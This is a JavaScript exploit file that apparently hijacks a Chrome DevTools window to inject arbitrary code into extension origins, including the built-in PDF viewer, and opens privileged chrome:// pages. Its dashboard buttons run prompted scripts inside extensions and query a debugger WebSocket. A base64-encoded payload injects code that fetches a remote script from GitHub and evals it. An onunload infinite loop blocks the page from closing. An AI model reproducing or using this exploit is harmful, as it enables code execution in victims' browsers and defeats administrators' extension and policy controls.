((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open(window.opener.location.origin + window.opener.location.pathname);
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`putindex.jscontentshere`))
                    const url = await writeFile('index.html', `${atob('putindex.htmlcontentshere')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);
            
            }
            document.open();
            //in order to update entry.html, replace the below string after atob(` with the base64 code of entry.html
            document.write(atob(`putentrycontentshere`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#troll').onclick = function () { // tr3nch support yippie
                let tr3nchpayload = atob("Ly8gVGhpcyBpcyBpbmNyZWRpYnkgamFua3kgYW5kIHdvbid0IHdvcmsgZm9yIHNvbWUgZXh0ZW5zaW9ucywgYnV0IHRoaXMgaXMgdGhlIG9ubHkgdGhpbmcgdGhhdHMgYWN0dWFsbHkgd29ya2VkIGZyb20ganVzdCBhIGRldnRvb2xzIHBhZ2UKY29uc3QgQ09NTU9OX1BBR0VTID0gWwogICJiYWNrZ3JvdW5kLmh0bWwiLAogICJwb3B1cC5odG1sIiwKICAiaW5kZXguaHRtbCIsCiAgIm9wdGlvbnMuaHRtbCIsCiAgIm1haW4uaHRtbCIsCiAgIl9nZW5lcmF0ZWRfYmFja2dyb3VuZF9wYWdlLmh0bWwiCl07IC8vIGlmIHUgaGF2ZSBhbiBleHRlbnNpb24gdGhhdCBoYXMgYSBiYWNrZ3JvdW5kIHBhZ2UgdGhhdHMgbm90IGluIGhlcmUgcGxzIHBpbmcgbWUgaW4gVGl0YW5pdW0gTmV0d29yayBhbmQgbG1rCi8vIHllcyBpayBJIGNvdWxkIGhhdmUgdGhlIGZ1bmN0aW9uIGluIHhzcy5qcywgYnV0IEkgZG9udCB3YW5uYSBicmVhayBhbnl0aGluZyBzbyBpZyBpbGwganVzdCBoYXZlIGl0IGV2YWwgdGhlIGJhc2U2NCBkZWNvZGUgb2YgdGhlIHNjcmlwdApmdW5jdGlvbiBleHRfaW5qZWN0dHIzbmNoKGV4dGlkLCBzY3JpcHQpIHsKICBmb3IgKGNvbnN0IHBhZ2Ugb2YgQ09NTU9OX1BBR0VTKSB7IC8vIEJydXRlIGZvcmNpbmcgcG90ZW50aWFsIGJhY2tncm91bmQgcGFnZXMgbG1hbyA6dHJvbGxleToKICAgIGNvbnN0IHVybCA9IGBjaHJvbWUtZXh0ZW5zaW9uOi8vJHtleHRpZH0vJHtwYWdlfWA7CiAgICB0cnkgewogICAgICBjb25zdCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTsKICAgICAgaWZyYW1lLnNyYyA9IHVybDsKICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpZnJhbWUpOwogICAgICBpZnJhbWUub25sb2FkID0gKCkgPT4gewogICAgICAgIHRyeSB7CiAgICAgICAgICBjb25zdCBvcmlnaW4gPSBuZXcgVVJMKHVybCkub3JpZ2luOwogICAgICAgICAgSW5zcGVjdG9yRnJvbnRlbmRIb3N0LnNldEluamVjdGVkU2NyaXB0Rm9yT3JpZ2luKG9yaWdpbiwgYAogICAgICAgICAgICBmZXRjaCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1doZWxlbWVudC9UcjNuY2gvcmVmcy9oZWFkcy9tYWluL3RyM25jaC5qcyIpCiAgICAgICAgICAgICAgLnRoZW4ocmVzID0+IHJlcy50ZXh0KCkpCiAgICAgICAgICAgICAgLnRoZW4oZXZhbCkKICAgICAgICAgICAgICAuY2F0Y2goY29uc29sZS5lcnJvcik7CiAgICAgICAgICBgKTsKICAgICAgICAgIGNvbnNvbGUubG9nKCJJbmplY3RlZCBpbnRvIiwgdXJsKTsKICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICBjb25zb2xlLndhcm4oIkZhaWxlZCB0byBpbmplY3QgaW50byIsIHVybCwgZSk7CiAgICAgICAgfQogICAgICB9OwoKICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgY29uc29sZS53YXJuKCJGYWlsZWQgdG8gY3JlYXRlIGlmcmFtZSBmb3IiLCB1cmwsIGUpOwogICAgfQogIH0KfQooYXN5bmMgKCkgPT4gewogIHdoaWxlICh0cnVlKSB7CiAgICBjb25zdCBleHRpZCA9IHByb21wdCgiRW50ZXIgZXh0ZW5zaW9uIElEIHRvIGluamVjdCB0cjNuY2ggaW50bzogIik7CiAgICAKICAgIGlmICghZXh0aWQpIGNvbnRpbnVlOwogICAgaWYgKGV4dGlkLnRvTG93ZXJDYXNlKCkgPT09ICJjYW5jZWwiKSBicmVhazsKICAgIGlmICghL15bYS16XXszMn0kLy50ZXN0KGV4dGlkKSkgY29udGludWU7CgogICAgdHJ5IHsKICAgICAgYXdhaXQgZXh0X2luamVjdHRyM25jaChleHRpZCk7CiAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgIGFsZXJ0KCJJbmplY3RlZCEgOnRyb2w6Iik7CiAgICAgIH0sIDEwMCk7CiAgICAgIGJyZWFrOwogICAgfSBjYXRjaCAoZSkgewogICAgICBhbGVydCgiSW5qZWN0aW5nIFRyM25jaCBmYWlsZWQsIGVpdGhlciB0cnkgYWdhaW4gb3IgZ28gdG8gdGhlIGZpbGVzeXN0ZW06IHVybCBhbmQgZGlzYWJsZSBibG9ja2VyIGV4dGVuc2lvbnMiKTsKICAgICAgY29uc29sZS5sb2coZSk7CiAgICAgIGJyZWFrOwogICAgfQogIH0KfSkoKTs=");
                eval(tr3nchpayload);
            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()
